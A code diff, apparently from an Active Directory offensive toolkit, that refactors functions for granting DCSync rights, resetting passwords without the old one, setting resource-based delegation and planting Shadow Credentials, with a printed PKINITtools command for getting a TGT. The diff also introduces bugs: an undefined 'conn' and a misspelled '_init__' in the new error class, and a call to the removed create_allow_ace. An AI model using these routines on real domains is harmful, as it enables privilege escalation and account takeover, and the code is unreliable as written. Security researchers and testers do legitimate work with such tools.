@@ -21,13 +21,26 @@ class BloodyError(Exception):
 class LDAPError(BloodyError):
     pass
 
+class ResultError(LDAPError):
+
+    def __init__(self, result):
+        self.result = result
+
+        if self.result['result'] == 50:
+            self.message = 'Could not modify object, the server reports insufficient rights: ' + self.result['message']
+        elif self.result['result'] == 19:
+            self.message = 'Could not modify object, the server reports a constrained violation: ' + self.result['message']
+        else:
+            self.message = 'The server returned an error: ' + conn.result['message']
+
+        super()._init__(self.message)
 
 class NoResultError(LDAPError):
     
     def __init__(self, search_base, ldap_filter):
         self.filter = ldap_filter
         self.base = search_base
-        self.message = f'No object found in {self.base} with filter: {ldap_filter}'
+        self.message = f'No object found in {self.base} with filter: {self.filter}'
         super().__init__(self.message)
 
 
@@ -40,7 +53,7 @@ class TooManyResultsError(LDAPError):
         self.entries = entries
         
         if len(self.entries) <= self.limit:
-            print(self.entries)
+            LOG.error(self.entries)
             self.results = "\n".join(entry['dn'] for entry in entries)
             self.message = f'{len(self.entries)} objects found in {self.base} with filter: {ldap_filter}\n'
             self.message += f'Please put the full target DN\n'
@@ -50,9 +63,9 @@ class TooManyResultsError(LDAPError):
             self.message += f'Please put the full target DN'
 
         super().__init__(self.message)
-
+     
 # 983551 Full control
-def create_ace(sid, privguid=None, accesstype=983551):
+def createACE(sid, privguid=None, accesstype=983551):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
     nace['AceFlags'] = 0x00
@@ -74,36 +87,7 @@ def create_ace(sid, privguid=None, accesstype=983551):
     nace['Ace'] = acedata
     return nace
 
-# Create an ALLOW ACE with the specified sid
-def create_allow_ace(sid):
-    nace = ldaptypes.ACE()
-    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x00
-    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
-    acedata['Mask'] = ldaptypes.ACCESS_MASK()
-    acedata['Mask']['Mask'] = 983551 # Full control
-    acedata['Sid']=sid
-    nace['Ace'] = acedata
-    return nace
-
-# Create an object ACE with the specified privguid and our sid
-# accesstype should be specified as either a write property flag or access control (for extended attributes)
-def create_object_ace(privguid, sid, accesstype):
-    nace = ldaptypes.ACE()
-    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x00
-    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
-    acedata['Mask'] = ldaptypes.ACCESS_MASK()
-    acedata['Mask']['Mask'] = accesstype
-    acedata['ObjectType'] = impacket.uuid.string_to_bin(privguid)
-    acedata['InheritedObjectType'] = b''
-    acedata['Sid'] = ldaptypes.LDAP_SID()
-    acedata['Sid'].fromCanonical(sid)
-    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
-    nace['Ace'] = acedata
-    return nace
-
-def create_empty_sd():
+def createEmptySD():
     sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
     sd['Revision'] = b'\x01'
     sd['Sbz1'] = b'\x00'
@@ -172,7 +156,7 @@ def getGroupMembers(conn, identity):
     """
     group_dn = resolvDN(conn, identity)
     conn.search(group_dn, '(objectClass=group)', attributes='member')
-    print(conn.response[0]['attributes']['member'])
+    LOG.info(conn.response[0]['attributes']['member'])
 
 
 def getObjectAttributes(conn, identity):
@@ -181,7 +165,7 @@ def getObjectAttributes(conn, identity):
     """
     dn = resolvDN(conn, identity)
     conn.search(dn, '(objectClass=*)', attributes='*')
-    print(conn.response[0]['attributes'])
+    LOG.info(conn.response[0]['attributes'])
 
 
 def addUser(conn, sAMAccountName, ou=None):
@@ -201,7 +185,7 @@ def addUser(conn, sAMAccountName, ou=None):
         naming_context = getDefaultNamingContext(conn)
         user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"
 
-    print(user_dn)
+    LOG.debug(user_dn)
     user_cls = ['top', 'person', 'organizationalPerson', 'user']
     attr = {'objectClass':  user_cls}
     #attr["cn"] = sAMAccountName
@@ -213,7 +197,7 @@ def addUser(conn, sAMAccountName, ou=None):
     #encoded_password = base64.b64encode(password.encode("utf16-le"))
     #attr["unicodePwd"] = encoded_password
     conn.add(user_dn, attributes=attr)
-    print(conn.result)
+    LOG.info(conn.result)
 
 
 def delObject(conn, identity):
@@ -265,7 +249,7 @@ def getUsersInOu(conn, base_ou):
     """
     conn.search(base_ou, '(objectClass=user)')
     for entry in conn.response:
-        print(entry['dn'])
+        LOG.info(entry['dn'])
 
 
 def delUserFromGroup(conn, member, group):
@@ -290,7 +274,11 @@ def addForeignObjectToGroup(conn, user_sid, group_dn):
 
 
 def addDomainSync(conn, sAMAccountName):
-
+    """
+    Give the right to perform DCSync with the user provided (You must have write permission on the domain)
+    Args:
+        sAMAccountName, DN, GUID or SID of the user
+    """
     # Query for the sid of our target user
     conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName, attributes=['objectSid'])
     user_sid = conn.entries[0]['objectSid'].raw_values[0]
@@ -311,27 +299,27 @@ def addDomainSync(conn, sAMAccountName):
     accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
 
     # these are the GUIDs of the get-changes and get-changes-all extended attributes
-    secDesc['Dacl']['Data'].append(create_ace(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
-    secDesc['Dacl']['Data'].append(create_ace(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
+    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
+    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
 
     dn = entry.entry_dn
     data = secDesc.getData()
     conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
 
 def changePassword(conn, target, new_pass):
-
+    """
+    Change the target password without knowing the old one using LDAPS
+    Args: 
+        sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
+        new password for the target
+    """
     target_dn = resolvDN(conn, target)
 
     modifyPassword.ad_modify_password(conn, target_dn, new_pass, old_password=None)
     if conn.result['result'] == 0:
-        print('Password changed successfully!')
+        LOG.info('Password changed successfully!')
     else:
-        if conn.result['result'] == 50:
-            raise Exception('Could not modify object, the server reports insufficient rights: ' + conn.result['message'])
-        elif conn.result['result'] == 19:
-            raise Exception('Could not modify object, the server reports a constrained violation: ' + conn.result['message'])
-        else:
-            raise Exception('The server returned an error: ' + conn.result['message'])
+        raise ResultError(conn.result)
 
 from impacket.dcerpc.v5 import samr, transport
 
@@ -339,8 +327,8 @@ def cryptPassword(session_key, password):
     try:
         from Cryptodome.Cipher import ARC4
     except Exception:
-        print("Warning: You don't have any crypto installed. You need pycryptodomex")
-        print("See https://pypi.org/project/pycryptodomex/")
+        LOG.error("Warning: You don't have any crypto installed. You need pycryptodomex")
+        LOG.error("See https://pypi.org/project/pycryptodomex/")
 
     from impacket import crypto
     
@@ -359,6 +347,16 @@ def cryptPassword(session_key, password):
     return sam_user_pass_enc
 
 def rpcChangePassword(domain, username, password, hostname, target, new_pass):
+    """
+    Change the target password without knowing the old one using RPC instead of LDAPS
+    Args: 
+        domain for NTLM authentication
+        NTLM username of the user with permissions on the target
+        NTLM password or hash of the user
+        IP or hostname of the DC to make the password change
+        sAMAccountName of the target
+        new password for the target
+    """
     rpctransport = transport.SMBTransport(hostname, filename=r'\samr')
 
     # TODO: change this ugly shit
@@ -399,6 +397,12 @@ def setDontreqpreauth():
 	return
 
 def setRbcd(conn, spn_sid, target):
+    """
+    Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
+    Args: 
+        object sid of the SPN (Controlled by you)
+        sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
+    """
     target_dn = resolvDN(conn, target)
 
     entries = conn.search(getDefaultNamingContext(conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
@@ -423,34 +427,33 @@ def setRbcd(conn, spn_sid, target):
             LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
     except IndexError:
         # Create DACL manually
-        sd = create_empty_sd()
+        sd = createEmptySD()
     sd['Dacl'].aces.append(create_allow_ace(spn_sid))
     conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
     if conn.result['result'] == 0:
         LOG.info('Delegation rights modified succesfully!')
         LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target)
     else:
-        if conn.result['result'] == 50:
-            LOG.error('Could not modify object, the server reports insufficient rights: %s', conn.result['message'])
-        elif conn.result['result'] == 19:
-            LOG.error('Could not modify object, the server reports a constrained violation: %s', conn.result['message'])
-        else:
-            LOG.error('The server returned an error: %s', conn.result['message'])
+        raise ResultError(conn.result)
 
 def setShadowCredentials(conn, sAMAccountName):
-
+    """
+    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
+    Args: 
+        sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
+    """
     ShadowCredentialsOutfilePath = None
     ShadowCredentialsExportType = 'PEM'
     ShadowCredentialsPFXPassword = None
 
     target_dn = resolvDN(conn, sAMAccountName)
-    print("Generating certificate")
+    LOG.debug("Generating certificate")
     certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
-    print("Certificate generated")
-    print("Generating KeyCredential")
+    LOG.debug("Certificate generated")
+    LOG.debug("Generating KeyCredential")
     keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
-    print("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
-    print("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+    LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
     conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
     results = None
     for entry in conn.response:
@@ -458,47 +461,42 @@ def setShadowCredentials(conn, sAMAccountName):
             continue
         results = entry
     if not results:
-        print('Could not query target user properties')
+        LOG.error('Could not query target user properties')
         return
     try:
         new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
-        print(new_values)
-        print("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
+        LOG.debug(new_values)
+        LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
         conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
         if conn.result['result'] == 0:
-            print("Updated the msDS-KeyCredentialLink attribute of the target object")
+            LOG.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
             if ShadowCredentialsOutfilePath is None:
                 path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
-                print("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+                LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
             else:
                 path = ShadowCredentialsOutfilePath
             if ShadowCredentialsExportType == "PEM":
                 certificate.ExportPEM(path_to_files=path)
-                print("Saved PEM certificate at path: %s" % path + "_cert.pem")
-                print("Saved PEM private key at path: %s" % path + "_priv.pem")
-                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-                print("Run the following command to obtain a TGT")
-                print("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
+                LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
+                LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
+                LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                LOG.info("Run the following command to obtain a TGT")
+                LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
             elif ShadowCredentialsExportType == "PFX":
                 if ShadowCredentialsPFXPassword is None:
                     password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                    print("No pass was provided. The certificate will be store with the password: %s" % password)
+                    LOG.info("No pass was provided. The certificate will be store with the password: %s" % password)
                 else:
                     password = ShadowCredentialsPFXPassword
                 certificate.ExportPFX(password=password, path_to_file=path)
-                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
-                print("Must be used with password: %s" % password)
-                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-                print("Run the following command to obtain a TGT")
-                print("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
+                LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                LOG.info("Must be used with password: %s" % password)
+                LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                LOG.info("Run the following command to obtain a TGT")
+                LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
         else:
-            if conn.result['result'] == 50:
-                print('Could not modify object, the server reports insufficient rights: %s' % conn.result['message'])
-            elif conn.result['result'] == 19:
-                print('Could not modify object, the server reports a constrained violation: %s' % conn.result['message'])
-            else:
-                print('The server returned an error: %s' % conn.result['message'])
+            raise ResultError(conn.result)
     except IndexError:
-        print('Attribute msDS-KeyCredentialLink does not exist')
+        LOG.error('Attribute msDS-KeyCredentialLink does not exist')
     return
 
